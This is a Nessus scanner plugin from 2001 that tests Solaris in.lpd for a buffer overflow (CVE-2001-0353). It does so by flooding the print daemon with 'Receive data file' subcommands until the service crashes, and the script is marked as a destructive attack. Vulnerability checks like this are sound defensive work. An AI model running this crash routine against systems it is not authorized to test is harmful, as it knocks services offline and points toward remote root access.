#
# This script was written by Renaud Deraison
#
# See the Nessus Scripts License for details
#
# This plugin was realized thanks to the help
# of the french "eXperts" working group - http://experts.securite.org
#

if(description)
{
   script_id(10727);
   if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2001-t-0007");
   script_bugtraq_id(2894);
 script_version ("$Revision: 1.22 $");
   script_cve_id("CVE-2001-0353");
   name["english"] = "Buffer overflow in Solaris in.lpd";
  
   script_name(english:name["english"]);
 
   desc["english"] = "
The remote lpd daemon seems to be vulnerable to a
buffer overflow when sent too many 'Receive data file'
commands.
An attacker may use this flaw to gain root on this host.

Solution : if the remote host is running Solaris, apply
the relevant patch from Sun. If not, report this problem to
renaud@nessus.org as it may be a false positive

Risk factor : High

See also : http://www.securityfocus.com/bid/2894";


   script_description(english:desc["english"]);
 
   summary["english"] = "Crashes the remote lpd";
   script_summary(english:summary["english"]);
 
   script_category(ACT_DESTRUCTIVE_ATTACK);
 
   script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison");
   script_family(english:"Gain root remotely");
   script_require_ports("Services/lpd", 515);
   script_dependencies("find_service.nes");
 
   exit(0);
}



#
# The code starts here
#

port = get_kb_item("Services/lpd");
if(!port)port = 515;


timestamp = rand();


#
# LPRng is not vulnerable to this flaw
# 
function is_lprng()
{
 soc = open_priv_sock_tcp(dport:port);
 if(!soc)
  exit(0);
 req = raw_string(9)+ string("lp") + raw_string(0x0A);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:4096);
 close(soc);
 if("SPOOLCONTROL" >< r)return(1);
 return(0);
}

function printer_present(name)
{
 soc = open_priv_sock_tcp(dport:port);
 if(!soc)
  return(0);
 req = raw_string(0x04,name, 0x0A);
 send(socket:soc, data:req); 
 r = recv(socket:soc, length:4096);
 if(egrep(pattern:"Your host does not have .*access", string:r))return(0);
 close(soc);
 if(strlen(r) > 1) 
  return(1);
 return(0);
}


#
# More default names should be added here
#
function find_printer()
{
 if(printer_present(name:"NESSUS:CHECK"))return("NESSUS:CHECK");
 return(0);
}

function subcommand(num)
{
 if(num < 10)pad = "0";
 else pad = "";
 return(raw_string(0x03) +"0 " + string("dfA0", pad, num, "nessus_test_",timestamp) + raw_string(0x0A));
}

function ack()
{
 return(raw_string(0x00));
}


function abort()
{
 return(raw_string(0x01, 0x0A));
}


if(!get_port_state(port))exit(0);

if(is_lprng())
{
 exit(0);
}

printer = find_printer();
if(!printer)
{
 #display("No printer found\n");
 exit(0);
}

soc = open_priv_sock_tcp(dport:port);
if(soc)
{
 req = raw_string(0x02, printer, 0x0A);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:1);
 if(r){
	exit(0);
	}
 flag = 0;
 for(i=0;i<400;i=i+1)
 {
 send(socket:soc, data:subcommand(num:i));
 send(socket:soc, data:ack());
 r = recv(socket:soc, length:2);
 if(flag)
 {
  if(!strlen(r)){
	if(i < 	100)exit(0);
	}
 }

 
 if(strlen(r)){
	flag = 1;
	#display(hex(r[0]), hex(r[1]), "\n");
	if(!(r == raw_string(0,0)))
	{
	#display("Abort\n");
	send(socket:soc, data:abort());
	r = recv(socket:soc, length:1);
	exit(0);
	}
      }
 }
 send(socket:soc, data:subcommand(num:i));
 send(socket:soc, data:ack());
 sleep(1);
 r = recv(socket:soc, length:4096);
 if(!r)security_hole(port);
 else
 {
 send(socket:soc, data:abort());
 r = recv(socket:soc, length:1);
 close(soc);
 }
}
